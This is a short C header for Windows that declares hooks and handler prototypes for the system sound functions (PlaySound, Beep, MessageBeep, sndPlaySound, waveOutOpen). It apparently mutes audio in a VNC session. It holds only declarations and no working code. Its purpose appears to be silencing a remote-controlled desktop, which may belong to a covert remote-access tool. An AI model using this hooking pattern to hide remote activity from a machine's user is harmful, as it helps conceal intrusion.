#ifndef VNCSILENCE_H_INCLUDED
#define VNCSILENCE_H_INCLUDED

typedef BOOL WINAPI __PlaySoundA(LPCSTR pszSound,HMODULE hmod,DWORD fdwSound);
typedef BOOL WINAPI __PlaySoundW(LPCWSTR pszSound,HMODULE hmod,DWORD fdwSound);
typedef BOOL WINAPI __Beep(DWORD dwFreq,DWORD dwDuration);
typedef BOOL WINAPI __MessageBeep(UINT uType);
typedef BOOL WINAPI __sndPlaySoundW(LPCWSTR pszSound,UINT fuSound);
typedef BOOL WINAPI __sndPlaySoundA(LPCSTR pszSound,UINT fuSound);
typedef MMRESULT WINAPI __waveOutOpen(LPHWAVEOUT phwo,UINT_PTR uDeviceID,LPWAVEFORMATEX pwfx,DWORD_PTR dwCallback,DWORD_PTR dwCallbackInstance,DWORD fdwOpen);

EXTERN_HOOK(PlaySoundA)
EXTERN_HOOK(PlaySoundW)
EXTERN_HOOK(Beep)
EXTERN_HOOK(MessageBeep)
EXTERN_HOOK(sndPlaySoundW)
EXTERN_HOOK(sndPlaySoundA)
EXTERN_HOOK(waveOutOpen)

BOOL WINAPI PlaySoundA_handler(LPCSTR pszSound,HMODULE hmod,DWORD fdwSound);
BOOL WINAPI PlaySoundW_handler(LPCWSTR pszSound,HMODULE hmod,DWORD fdwSound);
BOOL WINAPI Beep_handler(DWORD dwFreq,DWORD dwDuration);
BOOL WINAPI MessageBeep_handler(UINT uType);
BOOL WINAPI sndPlaySoundW_handler(LPCWSTR pszSound,UINT fuSound);
BOOL WINAPI sndPlaySoundA_handler(LPCSTR pszSound,UINT fuSound);
MMRESULT WINAPI waveOutOpen_handler(LPHWAVEOUT phwo,UINT_PTR uDeviceID,LPWAVEFORMATEX pwfx,DWORD_PTR dwCallback,DWORD_PTR dwCallbackInstance,DWORD fdwOpen);

#endif // VNCSILENCE_H_INCLUDED
